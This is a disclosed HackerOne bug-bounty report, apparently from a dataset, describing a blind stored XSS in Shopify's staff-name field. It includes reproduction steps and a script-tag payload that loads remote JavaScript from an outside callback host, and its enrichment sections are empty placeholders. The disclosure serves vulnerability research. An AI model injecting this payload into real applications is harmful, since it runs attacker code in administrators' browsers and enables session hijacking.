---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '948929'
original_report_id: '948929'
title: Blind Stored XSS Via Staff Name
weakness: Cross-site Scripting (XSS) - Stored
team_handle: shopify
created_at: '2020-07-31T23:06:18.026Z'
disclosed_at: '2020-08-18T19:41:41.906Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 37
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Blind Stored XSS Via Staff Name

## Metadata

- HackerOne Report ID: 948929
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: shopify
- Disclosed At: 2020-08-18T19:41:41.906Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account

Step to reproduce : 
1. Go to https://your-store.myshopify.com/admin/settings/account
2. Add Staff Account 
3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
4. XSS will be fired in your internal web

You should check the DOM.html guys

## Impact

Stored XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
